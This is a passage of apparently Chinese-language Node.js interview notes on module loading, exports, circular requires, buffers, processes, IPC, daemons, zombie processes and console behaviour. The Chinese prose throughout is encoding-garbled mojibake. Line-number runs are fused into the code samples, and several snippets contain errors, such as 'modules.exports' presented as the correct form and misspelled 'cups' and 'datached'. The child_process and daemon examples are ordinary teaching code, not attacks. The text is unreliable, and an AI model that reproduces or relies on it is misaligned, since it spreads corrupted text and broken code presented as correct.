è½½è¿‡ç¨‹ä¸­æ²¡æœ‰æ‰¾åˆ°ï¼Œä½†å‘çŽ°è¿™æ˜¯ä¸€ä¸ªç›®å½•ï¼Œè¿™ä¸ªé€‚åˆå°±ä¼šæŠŠè¿™ä¸ªç›®å½•å½“åšä¸€ä¸ªåŒ…æ¥å¤„ç†ï¼ŒNodeé‡‡ç”¨äº†commonjsè§„èŒƒï¼Œä¼šå…ˆåœ¨é¡¹ç›®çš„æ ¹ç›®å½•æŸ¥æ‰¾package.jsonæ–‡ä»¶ï¼Œå–å‡ºæ–‡ä»¶ä¸­å®šä¹‰çš„mainå±žæ€§æè¿°çš„å…¥å£æ–‡ä»¶è¿›è¡ŒåŠ è½½ï¼Œä¹Ÿæ²¡æœ‰åŠ è½½åˆ°ï¼Œåˆ™ä¼šæŠ›å‡ºé»˜è®¤é”™è¯¯ï¼šErrorï¼šCannot find module â€˜lib/hello.jsâ€™ node_modulesç›®å½•åŠ è½½ï¼šå¯¹äºŽç³»ç»Ÿæ¨¡å—ï¼Œè·¯å¾„æ–‡ä»¶æ¨¡å—éƒ½æ‰¾ä¸åˆ°ï¼ŒNodejsä¼šä»Žå½“å‰æ¨¡å—çš„çˆ¶ç›®å½•è¿›è¡ŒæŸ¥æ‰¾ï¼Œç›´åˆ°ç³»ç»Ÿçš„æ ¹ç›®å½• module.exports ä¸Ž exports çš„åŒºåˆ«exportsç›¸å½“äºŽ module.exports çš„å¿«æ·æ–¹å¼ï¼š 1const exports = module.exports ä½†æ˜¯ä¸èƒ½æ”¹å˜ exports çš„æŒ‡å‘ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ exports.test = &#39;a&#39;ï¼Œè¿™æ ·æ¥å¯¼å‡ºä¸€ä¸ªå¯¹è±¡ï¼Œä½†æ˜¯ä¸èƒ½é€šè¿‡ä¸‹é¢çš„ä¾‹å­ç›´æŽ¥èµ‹å€¼ï¼Œè¿™æ ·ä¼šæ”¹å˜ exports çš„æŒ‡å‘ 1234567891011// é”™è¯¯çš„å†™æ³•ï¼Œå°†ä¼šå¾—åˆ° undefinedexports = &#123; 'a':1, 'b':2 &#125;// æ­£ç¡®çš„å†™æ³•modules.exports =&#123; 'a':1, 'b':2 &#125; æ¨¡å—å¾ªçŽ¯å¼•ç”¨é—®é¢˜12345678910111213// a.jsconsole.log('aæ¨¡å—start');exports.test = 1;undeclaredVariable = 'aæ¨¡å—ä¸ºå£°æ˜Žå˜é‡'const b = require('./b');console.log('aæ¨¡å—åŠ è½½å®Œæ¯•ï¼šb.testå€¼',b.test);// b.js console.log('bæ¨¡å—start');exports.test = 2;const a = require('./a');console.log('undeclaredVariable:',undeclaredVariable)console.log('bæ¨¡å—åŠ è½½å®Œæ¯•ï¼ša.testå€¼ï¼š',a.test) æ‰§è¡Œ node a.js,ç»“æžœï¼š 12345aæ¨¡å—startbæ¨¡å—startundeclaredVariable:aæ¨¡å—æœªå£°æ˜Žå˜é‡bæ¨¡å—åŠ è½½å®Œæ¯•ï¼ša.testå€¼ï¼š1aæ¨¡å—åŠ è½½å®Œæ¯•ï¼šb.testå€¼ï¼š2 å¯åŠ¨a.jsä¼šåŠ è½½b.jsï¼Œé‚£ä¹ˆåœ¨b.jsä¸­åˆåŠ è½½åˆ°äº†a.jsï¼Œä½†æ˜¯æ­¤æ—¶a.jsæ¨¡å—hié˜¿å’©æœ‰æ‰§è¡Œå®Œï¼Œè¿”å›žçš„æ˜¯ä¸€ä¸ªa.jsæ¨¡å—çš„exportså¯¹è±¡æœªå®Œæˆçš„å‰¯æœ¬ç»™åˆ°b.jsæ¨¡å—ï¼ˆå› æ­¤ä¸ä¼šé™·å…¥æ­»å¾ªçŽ¯ï¼‰ï¼Œç„¶åŽb.jså®ŒæˆåŠ è½½ä¹‹åŽå°†exports å¯¹è±¡é€€ä¾›ç»™a.jsæ¨¡å— a æ¨¡å—ä¸­çš„ undeclaredVariable å˜é‡åœ¨ b.js æ˜¯å¦ä¼šæ‰“å°ï¼ŸundeclaredVariable æ˜¯ä¸€ä¸ªæœªå£°æ˜Žçš„å˜é‡ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªæŒ‚åœ¨å…¨å±€çš„å˜é‡ï¼Œé‚£ä¹ˆåœ¨å…¶ä»–åœ°æ–¹æ˜¯å¯ä»¥æ‹¿å¾—åˆ°çš„ å‡è®¾æœ‰ a.jsã€b.js ä¸¤ä¸ªæ¨¡å—ç›¸äº’å¼•ç”¨ï¼Œä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä¼šä¸ä¼šé™·å…¥æ­»å¾ªçŽ¯ï¼Ÿä¸ä¼šé™·å…¥æ­»å¾ªçŽ¯ BufferBufferä¸ŽCacheçš„åŒºåˆ«ç¼“å†²ï¼ˆBufferï¼‰ç¼“å†²æ˜¯ç”¨äºŽå¤„ç†äºŒè¿›åˆ¶æµæ•°æ®ï¼Œå°†æ•°æ®å­˜å‚¨èµ·æ¥ï¼Œå®ƒæ˜¯ä¸´æ—¶æ€§çš„ï¼Œå¯¹äºŽæµå¼æ•°æ®æ¥è¯´ï¼Œä¼šé‡‡ç”¨ç¼“å†²åŒºå°†æ•°æ®ä¸´æ—¶å­˜å‚¨èµ·æ¥ï¼Œç­‰ç¼“å†²åˆ°ä¸€å®šå¤§å°çš„æ—¶å€™å­˜å…¥ç¡¬ç›˜ä¸­ã€‚è§†é¢‘æ’­æ”¾å™¨å°±æ˜¯ä¸€ä¸ªç»å…¸ä¾‹å­ã€‚ ç¼“å­˜ï¼ˆCacheï¼‰ç¼“å­˜å¯ä»¥çœ‹åšä¸€ä¸ªä¸­é—´å±‚ï¼Œå¯ä»¥æ˜¯æ°¸ä¹…æ€§çš„å°†çƒ­ç‚¹æ•°æ®è¿›è¡Œç¼“å­˜ï¼Œä½¿å¾—è®¿é—®é€Ÿåº¦æ›´å¿«ã€‚ä¾‹å¦‚æˆ‘ä»¬é€šè¿‡å¯¹ memoryã€Redisç­‰å°†æ•°æ®ä»Žç¡¬ç›˜æˆ–è€…ç¬¬ä¸‰æ–¹æŽ¥å£ä¸­è¯·æ±‚è¿‡æ¥è¿›è¡Œç¼“å­˜ï¼Œç›®çš„å°±æ˜¯å°†æ•°æ®å­˜äºŽå†…å­˜çš„ç¼“å­˜åŒºä¸­ï¼Œè¿™æ ·å¯¹åŒä¸€ä¸ªèµ„æºè¿›è¡Œè®¿é—®ï¼Œé€Ÿåº¦ä¼šæ›´å¿«ï¼Œä¹Ÿå°±æ˜¯æ€§èƒ½ä¼˜åŒ–çš„ä¸€ä¸ªé‡è¦ç‚¹ã€‚ çº¿ç¨‹ä¸Žè¿›ç¨‹ä»€ä¹ˆæ˜¯è¿›ç¨‹ï¼ˆProcessï¼‰å’Œçº¿ç¨‹ï¼ˆThreadï¼‰ï¼Œä¹‹é—´çš„åŒºåˆ«è¿›ç¨‹è¿›ç¨‹æ˜¯è®¡ç®—ä¸­ç¨‹åºå…³äºŽæ•°æ®é›†åˆä¸Šçš„ä¸€æ¬¡è¿è¡Œæ´»åŠ¨ï¼Œæ˜¯ç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„åŸºæœ¬å•ä½ï¼Œæ˜¯æ“ä½œç³»ç»Ÿç»“æž„çš„åŸºç¡€ï¼Œè¿›ç¨‹æ˜¯çº¿ç¨‹çš„å®¹å™¨ã€‚å¯åŠ¨ä¸€ä¸ªæœåŠ¡ï¼Œè¿è¡Œä¸€ä¸ªå®žä¾‹ï¼Œå°±æ˜¯å¼€ä¸€ä¸ªæœåŠ¡è¿›ç¨‹ã€‚å¤šè¿›ç¨‹å°±æ˜¯è¿›ç¨‹çš„å¤åˆ¶ï¼ˆforkï¼‰ï¼Œforkå‡ºæ¥çš„æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„ç‹¬ç«‹ç©ºé—´åœ°å€ã€æ•°æ®æ ˆï¼Œä¸€ä¸ªè¿›ç¨‹æ— æ³•è®¿é—®å¦å¤–ä¸€ä¸ªè¿›ç¨‹é‡Œå®šä¹‰çš„å˜é‡ã€æ•°æ®ç»“æž„ï¼Œåªæœ‰å»ºç«‹äº†IPCé€šä¿¡ï¼Œè¿›ç¨‹ä¹‹é—´æ‰å¯ä»¥æ•°æ®å…±äº«ã€‚ çº¿ç¨‹çº¿ç¨‹æ˜¯æ“ä½œç³»ç»Ÿèƒ½å¤Ÿè¿›è¡Œè¿ç®—è°ƒåº¦çš„æœ€å°å•ä½ï¼Œçº¿ç¨‹æ˜¯éš¶å±žè¿›ç¨‹çš„ï¼Œè¢«åŒ…å«ä¸Žè¿›ç¨‹ä¹‹ä¸­çš„ã€‚ä¸€ä¸ªçº¿ç¨‹åªèƒ½éš¶å±žä¸€ä¸ªè¿›ç¨‹ï¼Œä½†æ˜¯ä¸€ä¸ªè¿›ç¨‹æ˜¯å¯ä»¥æ‹¥æœ‰å¤šä¸ªçº¿ç¨‹çš„ã€‚ åŒä¸€ä¸ªä»£ç ï¼Œå¯ä»¥æ ¹æ®ç³»ç»ŸCPUæ ¸å¿ƒæ•°å¯åŠ¨å¤šä¸ªè¿›ç¨‹ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰å±žäºŽè‡ªå·±çš„ç‹¬ç«‹è¿è¡Œç©ºé—´ï¼Œè¿›ç¨‹ä¹‹é—´æ˜¯ä¸äº’ç›¸å½±å“çš„ã€‚åŒä¸€è¿›ç¨‹ä¸­çš„å¤šæ¡çº¿ç¨‹å°†å…±äº«è¯¥è¿›ç¨‹ä¸­çš„å…¨éƒ¨ç³»ç»Ÿèµ„æºï¼Œå¦‚è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œæ–‡ä»¶æè¿°å’Œä¿¡å·å¤„ç†ç­‰ã€‚ä½† åŒä¸€è¿›ç¨‹ä¸­çš„å¤šä¸ªçº¿ç¨‹æœ‰å„è‡ªçš„è°ƒç”¨æ ˆï¼Œè‡ªå·±çš„å¯„å­˜å™¨çŽ¯å¢ƒï¼Œè‡ªå·±çš„çº¿ç¨‹æœ¬åœ°å­˜å‚¨ã€‚ ä»€ä¹ˆæ˜¯å­¤å„¿è¿›ç¨‹çˆ¶è¿›ç¨‹åˆ›å»ºå­è¿›ç¨‹ä¹‹åŽï¼Œçˆ¶è¿›ç¨‹é€€å‡ºäº†ï¼Œä½†æ˜¯çˆ¶è¿›ç¨‹å¯¹åº”çš„ä¸€ä¸ªæˆ–è€…å¤šä¸ªå­è¿›ç¨‹è¿˜åœ¨è¿è¡Œï¼Œè¿™äº›å­è¿›ç¨‹ä¼šè¢«ç³»ç»Ÿçš„initè¿›ç¨‹æ”¶å…»ï¼Œå¯¹åº”çš„ç¨‹åºppidä¸º1ï¼Œè¿™å°±æ˜¯å­¤å„¿è¿›ç¨‹ã€‚ åˆ›å»ºå¤šè¿›ç¨‹æ—¶ï¼Œä»£ç é‡Œæœ‰app.listen(port)åœ¨è¿›è¡Œforkæ—¶ï¼Œä¸ºä»€ä¹ˆæ²¡æœ‰æŠ¥ç«¯å£è¢«å ç”¨ç«¯å£è¢«å ç”¨çš„æƒ…å†µï¼š 12345678910111213141516// master.jsconst fork = require('child_process').fork;const cups = require('os').cups();for(let i=0;i&lt;cups.length;i++)&#123; const worker = fork('worker.js') console.log('worker process created, pid: %s ppid: %s', worker.pid, process.pid);&#125;// worker.jsconst http = require('http');http.createServer((req,res)=&gt;&#123; res.send('I am worker,pid:'+process.pid+', ppid: '+process.pid)&#125;).listen(3000);// æŽ§åˆ¶å°æ‰§è¡Œnode master.jsåªæœ‰ä¸€ä¸ªworker å¯ä»¥ç›‘å¬ 3000 ç«¯å£ï¼Œå…¶ä½™ä¼šæŠ›å‡º Error:listen EADDRINUSE :::3000é”™è¯¯ å¤šè¿›ç¨‹æ¨¡å¼å¯é€šè¿‡å¥æŸ„ä¼ é€’ä¸ä¼šæœ‰ç«¯å£å ç”¨çš„é—®é¢˜ã€‚ å½“çˆ¶å­è¿›ç¨‹ä¹‹é—´å»ºç«‹IPCé€šé“ä¹‹åŽï¼Œé€šè¿‡å­è¿›ç¨‹å¯¹è±¡çš„sendæ–¹æ³•å‘é€æ¶ˆæ¯ï¼Œç¬¬äºŒä¸ªå‚æ•°sendHandleå°±æ˜¯å¥æŸ„ï¼Œå¯ä»¥æ˜¯TCPå¥—æŽ¥å­—ï¼ŒTCPæœåŠ¡å™¨ã€UDPå¥—æŽ¥å­—ç­‰ï¼Œä¸ºäº†è§£å†³ä¸Šé¢å¤šè¿›ç¨‹ç«¯å£å ç”¨é—®é¢˜ï¼Œå°†ä¸»è¿›ç¨‹çš„socketä¼ é€’åˆ°å­è¿›ç¨‹ï¼š 123456789101112131415161718192021222324252627282930313233// master.jsconst fork = require('child_process').fork;const cups = require('os').cpus();const server = require('net').createServer();server.listen(3000);process.title = 'node-master';for(let i=0;i&lt;cpus.length;i++)&#123; const worker = fork('worker.js') worker.send('server',server); console.log('worker process created, pid: %s ppid: %s', worker.pid, process.pid); if(i+1 === cpus.length)&#123; console.log('serve close'); server.close(); // å…³é—­æœåŠ¡å™¨ç›‘å¬ï¼Œäº¤ç”±å­è¿›ç¨‹å¤„ç† &#125;&#125;// worker.jsconst http = require('http');const server = http.createServer((req,res)=&gt;&#123; res.end('I am worker, pid: ' + process.pid + ', ppid: ' + process.ppid);&#125;)let worker;process.title = 'node-worker';process.on('message',(message,sendHandle)=&gt;&#123; if(message === 'server')&#123; worker = sendHandle; worker.on('connection',(socket)=&gt;&#123; server.emit('connection',socket) &#125;) &#125;&#125;) ä»€ä¹ˆæ˜¯IPCé€šä¿¡ï¼Œå¦‚ä½•å»ºç«‹ï¼Œä»€ä¹ˆåœºæ™¯ä¸‹ä¼šä½¿ç”¨IPC(inter-process communication)ï¼Œå³è¿›ç¨‹é—´é€šä¿¡æŠ€æœ¯ï¼Œç”±äºŽæ¯ä¸ªè¿›ç¨‹åˆ›å»ºä¹‹åŽéƒ½æœ‰è‡ªå·±çš„ç‹¬ç«‹åœ°å€ç©ºé—´ï¼Œå®žçŽ°IPCçš„ç›®çš„å°±æ˜¯è¿›ç¨‹ä¹‹é—´çš„èµ„æºå…±äº«è®¿é—®ï¼Œå®žçŽ°IPCçš„æ–¹å¼æœ‰å¤šç§ï¼šç®¡é“ã€æ¶ˆæ¯é˜Ÿåˆ—ã€ä¿¡å·é‡ã€Domain Socketï¼ŒNodejsé€šè¿‡pipeæ¥å®žçŽ°ã€‚ æœªä½¿ç”¨IPCçš„æƒ…å†µï¼š 123456789// pipe.jsconst spawn = require('child_process').spawn;const child = spawn('node',['worker.js']);console.log(process.pid,child.pid);// worker.jsconsole.log('I am worker,PID:',process.pid)// æ‰§è¡Œ node pipe.jsï¼Œè¾“å‡ºä¸»çº¿ç¨‹çš„idï¼Œå­çº¿ç¨‹çš„idï¼Œä½†æ˜¯å­çº¿ç¨‹worker.jsçš„ä¿¡æ¯æ²¡æœ‰åœ¨æŽ§åˆ¶å°æ‰“å°ï¼ŒåŽŸå› æ˜¯æ–°åˆ›å»ºçš„å­è¿›ç¨‹æœ‰è‡ªå·±çš„ stdioæµ åˆ›å»ºä¸€ä¸ªçˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ä¹‹é—´ä¼ é€’æ¶ˆæ¯çš„IPCé€šé“å®žçŽ°è¾“å‡ºä¿¡æ¯ 123456789// ä¿®æ”¹pipe.jsè®©å­è¿›ç¨‹çš„stdioå’Œå½“å‰è¿›ç¨‹çš„stdioä¹‹é—´å»ºç«‹ç®¡é“é“¾æŽ¥ï¼Œè¿˜å¯ä»¥é€šè¿‡spawnæ–¹æ³•çš„stdioé€‰é¡¹å»ºç«‹IPCæœºåˆ¶// pipe.jsconst spawn = require('child_process').spawn;const child = spawn('node',['worker.js']);child.stdout.pipe(process.stdout);console.log(process.pid,child.pid);// çˆ¶è¿›ç¨‹ä¸Žå­è¿›ç¨‹çš„é€šä¿¡// çˆ¶è¿›ç¨‹åœ¨åˆ›å»ºå­è¿›ç¨‹ä¹‹å‰ä¼šå…ˆåŽ»åˆ›å»ºIPCé€šé“å¹¶ä¸€ç›´ç›‘å¬è¯¥é€šé“ï¼Œä¹‹åŽå¼€å§‹åˆ›å»ºå­è¿›ç¨‹å¹¶é€šè¿‡çŽ¯å¢ƒå˜é‡ï¼ˆNODE_CHANNEL_FDï¼‰çš„æ–¹å¼å°†IPCé¢‘é“çš„æ–‡ä»¶æè¿°ç¬¦ä¼ é€’ç»™å­è¿›ç¨‹ï¼Œå­è¿›ç¨‹å¯åŠ¨æ—¶æ ¹æ®ä¼ é€’çš„æ–‡ä»¶æè¿°ç¬¦åŽ»é“¾æŽ¥IPCé€šé“ï¼Œä»Žè€Œå»ºç«‹çˆ¶å­è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡æœºåˆ¶ã€‚ Node.jsæ˜¯å•çº¿ç¨‹è¿˜æ˜¯å¤šçº¿ç¨‹ï¼Œä¸ºä»€ä¹ˆä¼šå•çº¿ç¨‹javascriptæ˜¯å•çº¿ç¨‹ï¼Œåœ¨æœåŠ¡ç«¯è¿è¡ŒçŽ¯å¢ƒçš„nodejsä¸æ˜¯å•çº¿ç¨‹ã€‚ æµè§ˆå™¨çŽ¯å¢ƒä¸­å¯¹äºŽDOMçš„æ“ä½œæ˜¯å•çº¿ç¨‹çš„ï¼Œé¿å…DOMæ¸²æŸ“å†²çªï¼Œåœ¨æµè§ˆå™¨ä¸­UIæ¸²æŸ“çº¿ç¨‹å’ŒJSæ‰§è¡Œå¼•æ“Žæ˜¯äº’æ–¥çš„ï¼Œä¸€æ–¹åœ¨æ‰§è¡Œå¼éƒ½ä¼šå¯¼è‡´å¦ä¸€æ–¹è¢«æŒ‚èµ·ï¼Œè¿™æ˜¯ç”±JSå¼•æ“Žæ‰€å†³å®šçš„ã€‚ å…³äºŽå®ˆæŠ¤è¿›ç¨‹ï¼Œæ˜¯ä»€ä¹ˆï¼Œä¸ºä»€ä¹ˆï¼Œæ€Žä¹ˆç¼–å†™ï¼Ÿå®ˆæŠ¤è¿›ç¨‹è¿è¡Œåœ¨åŽå°ä¸å—ç»ˆç«¯å½±å“ã€‚ åˆ›å»ºæ­¥éª¤ åˆ›å»ºå­è¿›ç¨‹ åœ¨å­è¿›ç¨‹ä¸­åˆ›å»ºæ–°ä¼šè¯ï¼ˆè°ƒç”¨ç³»ç»Ÿå‡½æ•°setsidï¼‰ æ”¹å˜å­è¿›ç¨‹å·¥ä½œç›®å½•ï¼ˆå¦‚ï¼šâ€™/â€˜æˆ–è€…â€™/usr/â€˜ç­‰ï¼‰ çˆ¶è¿›ç¨‹ç»ˆæ­¢ ç¼–å†™demo12345678910111213141516171819202122232425// index.jsæ–‡ä»¶çš„å¤„ç†é€»è¾‘ä½¿ç”¨ spawnåˆ›å»ºå­è¿›ç¨‹å®Œæˆç¬¬ä¸€æ­¥ï¼Œè®¾ç½®options.detachedä¸ºtrueå¯ä»¥ä½¿å¾—å­è¿›ç¨‹åœ¨çˆ¶è¿›ç¨‹é€€å‡ºåŽç»§ç»­è¿è¡Œï¼ˆç³»ç»Ÿå±‚ä¼šè°ƒç”¨setsidæ–¹æ³•ï¼‰ï¼Œè¿™æ˜¯ç¬¬äºŒæ­¥ã€‚options.cwdæŒ‡å®šå½“å‰å­è¿›ç¨‹å·¥ä½œç›®å½•ä¸åšè®¾ç½®é»˜è®¤ç»§æ‰¿å½“å‰å·¥ä½œç›®å½•ï¼Œè¿™æ˜¯ç¬¬ä¸‰æ­¥ã€‚è¿è¡Œdaemon.unref()é€€å‡ºçˆ¶è¿›ç¨‹ï¼Œç¬¬å››æ­¥ã€‚// index.jsconst spawn = require('child_process').spawn;function startDaemon()&#123; const daemon = spawn('node',['daemon.js'],&#123; cwd:'/usr', datached:true, stdio:'ignore', &#125;) console.log('å®ˆæŠ¤è¿›ç¨‹å¼€å¯ çˆ¶è¿›ç¨‹ pid: %s, å®ˆæŠ¤è¿›ç¨‹ pid: %s', process.pid, daemon.pid); daemon.unref();&#125;startDaemon();// daemon.jsæ–‡ä»¶å“©é€»è¾‘å¼€å¯ä¸€ä¸ªå®šæ—¶å™¨æ¯10ç§’è¿è¡Œä¸€æ¬¡ï¼Œä½¿å¾—è¿™ä¸ªèµ„æºä¸ä¼šé€€å‡ºï¼ŒåŒæ—¶å†™å…¥æ—¥å¿—åˆ°å­è¿›ç¨‹å½“å‰çš„å·¥ä½œç›®å½•ä¸‹// /usr/daemon.jsconst fs = require('fs');const &#123;Console&#125; = require('console');const logger = new Console(fs.createWriteStream('./stdout.log'),fs.createWriteStream('./stderr.log'));setInterval(function()&#123; logger.log('daemon pid:',process.pid,'ppid: ',process.ppid)&#125;,1000*10) å®žé™…å·¥ä½œä¸­å®ˆæŠ¤è¿›ç¨‹å¾ˆå¤šï¼Œä¾‹å¦‚PM2,Egg-Clusterç­‰ï¼Œå®žé™…å·¥ä½œä¸Šå¯¹äºŽå®ˆæŠ¤è¿›ç¨‹çš„å¥å£®æ€§è¦æ±‚è¿˜æ˜¯å¾ˆé«˜çš„ï¼Œä¾‹å¦‚ï¼šè¿›ç¨‹çš„å¼‚å¸¸ç›‘å¬ï¼Œå·¥ä½œè¿›ç¨‹ç®¡ç†è°ƒåº¦ï¼Œè¿›ç¨‹æŒ‚æŽ‰ä¹‹åŽé‡å¯ç­‰ç­‰ã€‚ å®žçŽ°ä¸€ä¸ªç®€å•çš„å‘½ä»¤è¡Œäº¤äº’ç¨‹åºé‡‡ç”¨å­è¿›ç¨‹ child_processçš„spawnæ–¹æ³•ï¼š 123const spawn = require('child_process').spawn;const child = spawn('echo',['ç®€å•çš„å‘½ä»¤è¡Œäº¤äº’']);child.stdout.pipe(process.stdout) // å°†å­è¿›ç¨‹çš„è¾“å‡ºä½œä¸ºå½“å‰è¿›ç¨‹çš„è¾“å…¥ï¼Œæ‰“å°åœ¨æŽ§åˆ¶å° è¿›ç¨‹çš„å½“å‰å·¥ä½œç›®å½•æ˜¯ä»€ä¹ˆï¼Œæœ‰ä»€ä¹ˆç”¨è¿›ç¨‹çš„å½“å‰å·¥ä½œç›®å½•å¯ä»¥é€šè¿‡process.cwd()å‘½ä»¤èŽ·å–ï¼Œé»˜è®¤ä¸ºå½“å‰å¯åŠ¨çš„ç›®å½•ï¼Œå¦‚æžœæ˜¯åˆ›å»ºå­è¿›ç¨‹åˆ™ç»§æ‰¿äºŽçˆ¶è¿›ç¨‹çš„ç›®å½•ï¼Œå¯ä»¥é€šè¿‡process.chdir()å‘½ä»¤é‡ç½®ï¼Œä¾‹å¦‚é€šè¿‡spawnå‘½ä»¤åˆ›å»ºçš„å­è¿›ç¨‹å¯ä»¥æŒ‡å®šcwdé€‰é¡¹è®¾ç½®å­è¿›ç¨‹çš„å·¥ä½œç›®å½•ã€‚ æœ‰ä»€ä¹ˆç”¨ï¼Œä¾‹å¦‚fsè¯»å–æ–‡ä»¶ï¼Œå¦‚æžœè®¾ç½®ä¸ºç›¸å¯¹è·¯å¾„åˆ™æ˜¯ç›¸å½“äºŽå½“å‰è¿›ç¨‹å¯åŠ¨çš„ç›®å½•è¿›è¡ŒæŸ¥æ‰¾ï¼Œæ‰€ä»¥ï¼Œå¯åŠ¨ç›®çš„è®¾ç½®æœ‰è¯¯çš„æƒ…å†µä¸‹å°†æ— æ³•å¾—åˆ°æ­£ç¡®çš„ç»“æžœã€‚è¿˜æœ‰ä¸€ç§æƒ…å†µç¨‹åºé‡Œå¼•ç”¨ç¬¬ä¸‰æ–¹æ¨¡å—ä¹Ÿæ˜¯æ ¹æ®å½“å‰è¿›ç¨‹å¯åŠ¨çš„ç›®å½•æ¥è¿›è¡ŒæŸ¥æ‰¾çš„ å¤šè¿›ç¨‹æˆ–è€…å¤šä¸ªWebæœåŠ¡ä¹‹é—´çš„çŠ¶æ€å…±äº«é—®é¢˜å¤šè¿›ç¨‹æ¨¡å¼ä¸‹å„ä¸ªè¿›ç¨‹ä¹‹é—´æ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼Œä¾‹å¦‚ç”¨æˆ·ç™»å½•ä¹‹åŽseesionçš„ä¿å­˜ï¼Œå¦‚æžœä¿å­˜åœ¨æœåŠ¡è¿›ç¨‹é‡Œï¼Œé‚£ä¹ˆå¦‚æžœæˆ‘æœ‰4ä¸ªå·¥ä½œè¿›ç¨‹ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½è¦ä¿å­˜ä¸€ä»½è¿™æ˜¯æ²¡æœ‰å¿…è¦çš„ã€‚å‡è®¾æœåŠ¡é‡å¯äº†æ•°æ®ä¹Ÿä¼šä¸¢å¤±ã€‚å¤šä¸ªWebæœåŠ¡ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œè¿˜ä¼šå‡ºçŽ°åœ¨Aæœºå™¨åˆ›å»ºäº†Sessionï¼Œå½“è´Ÿè½½å‡è¡¡åˆ†åˆ°Bæœºå™¨ä¸Šä¹‹åŽè¿˜éœ€è¦å†åˆ›å»ºä¸€ä»½ï¼Œä¸€èˆ¬çš„åšæ³•æ˜¯é€šè¿‡Redisæˆ–è€…æ•°æ®åº“æ¥åšæ•°æ®å…±äº« ä»€ä¹ˆæ˜¯åƒµå°¸è¿›ç¨‹ä½¿ç”¨forkå¯ä»¥åˆ›å»ºå­è¿›ç¨‹ï¼Œæ­£å¸¸æƒ…å†µè¿›ç¨‹é€€å‡ºï¼Œå†…æ ¸è¦é‡Šæ”¾è¿›ç¨‹æ‰€å ç”¨çš„èµ„æºï¼šæ‰“å¼€çš„æ–‡ä»¶ã€å ç”¨çš„å†…å­˜ç­‰ï¼Œä½†æ˜¯è¿›ç¨‹çš„PIDã€é€€å‡ºçŠ¶æ€ã€è¿è¡Œæ—¶é—´ç­‰ä¼šè¿›è¡Œä¿ç•™ï¼ŒçŸ¥é“çˆ¶è¿›ç¨‹è°ƒç”¨wait/waitpidæ¥èŽ·å–å­è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯æ—¶ï¼Œè¿™äº›èµ„æºæ‰ä¼šé‡Šæ”¾ã€‚ å¦‚æžœå­è¿›ç¨‹é€€å‡ºä¹‹åŽï¼Œçˆ¶è¿›ç¨‹æ²¡æœ‰è°ƒç”¨wait/waitpidæ¥èŽ·å–å­è¿›ç¨‹çš„çŠ¶æ€ï¼Œé‚£ä¹ˆä¿ç•™çš„è¿›ç¨‹å·å°†ä¼šä¸€ç›´è¢«å ç”¨ï¼Œä¸”å ç”¨ç³»ç»Ÿèµ„æºï¼Œç§°ä¸ºåƒµæ­»æˆ–åƒµå°¸è¿›ç¨‹ã€‚ å…ƒå‡¶æ˜¯å…¶çˆ¶è¿›ç¨‹ï¼Œæˆ‘ä»¬æŠŠå…ƒå‡¶killæŽ‰ä¹‹åŽï¼Œåƒµå°¸è¿›ç¨‹ä¼šå˜ä¸ºå­¤å„¿è¿›ç¨‹è¢«ç³»ç»Ÿçš„ init è¿›ç¨‹pid=1çš„è¿›ç¨‹æ‰€æ”¶å…»ï¼Œinitè¿›ç¨‹ä¼šå¯¹è¿™äº›å­¤å„¿è¿›ç¨‹è¿›è¡Œç®¡ç†ï¼ˆè°ƒç”¨wait/waitpidï¼‰é‡Šæ”¾å…¶å ç”¨èµ„æºã€‚ Consoleconsoleæ˜¯å¼‚æ­¥è¿˜æ˜¯åŒæ­¥çš„consoleæ—¢ä¸æ˜¯æ€»æ˜¯åŒæ­¥çš„ï¼Œä¹Ÿä¸æ€»æ˜¯å¼‚æ­¥çš„ï¼Œæ˜¯å¦ä¸ºåŒæ­¥å–å†³äºŽé“¾æŽ¥æ˜¯ä»€ä¹ˆæµä»¥åŠæ“ä½œç³»ç»Ÿæ˜¯Windowè¿˜æ˜¯Posix åŒæ­¥å†™å°†ä¼šé˜»å¡žå®žè·µå¾ªçŽ¯ç›´åˆ°å†™å®Œæˆã€‚ æ–‡ä»¶ï¼ˆFilesï¼‰ï¼šWindowså’ŒPOSIXå¹³å°éƒ½æ˜¯åŒæ­¥ ç»ˆç«¯ï¼ˆTTYSï¼‰ï¼šWindowså¹³å°ä¸‹åŒæ­¥ï¼Œåœ¨POSIXå¹³å°ä¸‹å¼‚æ­¥ ç®¡é“ï¼ˆPipesï¼‰ï¼šWindowså¹³å°ä¸‹åŒæ­¥ï¼ŒPOSIXå¹³å°ä¸‹å¼‚æ­¥ å¦‚ä½•å®žçŽ°ä¸€ä¸ªconsole.logå¯åˆ©ç”¨ process.stdoutå°†è¾“å…¥æµæ•°æ®è¾“å‡ºåˆ°è¾“å‡ºæµï¼ˆå³è¾“å‡ºåˆ°ç»ˆç«¯ï¼‰ 1process.stdout.write('xxx'+'\n') ä¸ºä»€ä¹ˆconsole.log()æ‰§è¡Œå®Œå°±é€€å‡ºä¸€æ—¦äº§ç”Ÿäº‹ä»¶å¾ªçŽ¯ï¼Œå°±ä¼šé•¿äº§ç”Ÿä¸€ä¸ªWhile(true)çš„æ­»å¾ªçŽ¯ï¼Œä¾‹å¦‚å®šæ—¶å™¨ï¼Œconsole.logåˆ™æ²¡æœ‰äº§ç”Ÿwatch/handlersï¼Œåœ¨äº‹ä»¶å¾ªçŽ¯ä¸€æ¬¡å°±é€€å‡ºäº†ã€‚ 